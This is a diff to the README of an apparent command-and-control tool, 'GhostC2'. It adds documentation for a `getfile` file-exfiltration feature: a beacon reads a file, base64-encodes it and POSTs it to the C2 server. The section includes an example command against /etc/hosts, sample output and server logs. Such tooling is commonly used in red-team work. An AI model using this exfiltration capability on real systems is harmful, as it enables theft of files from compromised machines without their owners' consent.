@@ -160,10 +160,84 @@ Quick tasks for both Windows and Linux/macOS:
 - `netstat` variants
 
 ---
+## 📂 File Exfiltration
+
+GhostC2 now supports secure, encoded file exfiltration via the live console or task queue.
+
+---
+
+### ✅ How It Works
+
+Use the `getfile` command to retrieve any accessible file from a beacon:
+
+```
+getfile /etc/hosts
+```
+
+The agent will:
+
+1. Read the specified file
+2. Base64-encode its contents
+3. POST the encoded data to the C2 server
+4. The server will decode and save it to:
+   ```
+   server/downloads/<hostname>/<filename>
+   ```
+
+---
+
+### 🔒 Notes
+
+- Exfiltrated files are stored per-host for traceability
+- Server-side decoding is automatic
+- The `[EXFIL:<filepath>]` header ensures safe parsing
+- Console output still displays result confirmation
+
+---
+
+### 🛠 Example
+
+**Command:**
+```
+getfile /etc/hosts
+```
+
+**Console output:**
+```
+$ getfile /etc/hosts
+[EXFIL:/etc/hosts]
+aW50ZXJuZXQgY29ycnVwdGlvbiBldmVyeXdoZXJlCg==
+```
+
+**Server log:**
+```
+[DEBUG] Saving to: downloads/MacBook-Pro.local/hosts
+[+] File received from MacBook-Pro.local: hosts saved to downloads/MacBook-Pro.local/hosts
+```
+
+---
+
+### 📁 Tip
+
+Add `server/downloads/` to your `.gitignore`:
+
+```
+# Avoid pushing exfiltrated files
+server/downloads/
+```
+
+---
+
+### ⏭️ Planned Enhancements
+
+- UI for browsing & downloading exfiltrated files
+- File overwrite warning system
+- Directory / wildcard exfil support
+- Operator action logging
+
 
 ### ⏭️ Coming Soon
 
-- File exfiltration via `getfile <path>`
 - Per-host command logs
 - Session tabs for multitarget ops
 
